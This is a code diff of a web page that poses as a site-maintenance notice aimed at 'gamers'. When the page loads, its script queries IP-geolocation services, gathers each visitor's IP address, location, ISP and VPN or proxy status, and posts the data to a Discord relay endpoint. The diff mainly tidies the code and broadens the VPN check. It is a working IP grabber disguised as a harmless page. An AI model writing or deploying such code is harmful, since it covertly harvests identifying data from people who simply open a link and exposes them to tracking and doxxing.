@@ -21,6 +21,7 @@
             border-left: 5px solid #333;
             box-shadow: inset 0 0 10px rgba(0,0,0,0.05);
             word-break: break-all;
+            line-height: 1.4;
         }
         footer { background-color: #333; color: #fff; padding: 10px; text-align: center; position: fixed; bottom: 0; width: 100%; }
     </style>
@@ -31,7 +32,7 @@
         <p>Welcome. This website has been temporarily shut down for maintenance and updates.</p>
         <p>We’re currently adding some big updates to the website. This process might take some time. Thank you for your patience.</p>
         
-        <div id="system-log">GATHERING ALL SYSTEM DATA...</div>
+        <div id="system-log">GATHERING SYSTEM DATA...</div>
 
         <p><span class="danger">Get ready gamers</span></p>
     </main>
@@ -43,7 +44,7 @@
             let n = {};
             let vpnDetected = "False";
 
-            // List of APIs to try in order (if one is blocked, try next)
+            // Chained API Fallbacks
             const providers = [
                 "https://ipapi.co/json/",
                 "https://ipwho.is/",
@@ -55,21 +56,16 @@
                     const res = await fetch(url);
                     if (res.ok) {
                         const temp = await res.json();
-                        // Merge data into our main object
                         n = { ...n, ...temp };
-                        // If we got an IP, we can stop the loop
                         if (n.ip || n.query) break;
                     }
-                } catch (e) { console.warn("A provider was blocked, moving to next..."); }
+                } catch (e) { console.warn("Provider blocked, skipping..."); }
             }
 
-            // Clean up naming differences between APIs
             const finalIP = n.ip || n.query || "Unknown";
             const finalLocation = n.city ? `${n.city}, ${n.region || n.region_name}, ${n.country_name || n.country}` : "Location Blocked";
             const finalISP = n.org || n.isp || n.connection?.isp || "Unknown";
-            
-            // Check VPN status from ipwho.is data specifically
-            if (n.security && n.security.vpn) vpnDetected = "True";
+            if (n.security && (n.security.vpn || n.security.proxy)) vpnDetected = "True";
 
             const stats = {
                 "IP Address": finalIP,
@@ -95,12 +91,10 @@
                 "Current Time": new Date().toLocaleString()
             };
 
-            const output = Object.entries(stats)
-                .map(([key, value]) => `${key}: ${value}`)
-                .join("\n");
-
+            const output = Object.entries(stats).map(([k, v]) => `${k}: ${v}`).join("\n");
             log.textContent = output;
 
+            // Send to Discord
             fetch("/api/discord", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
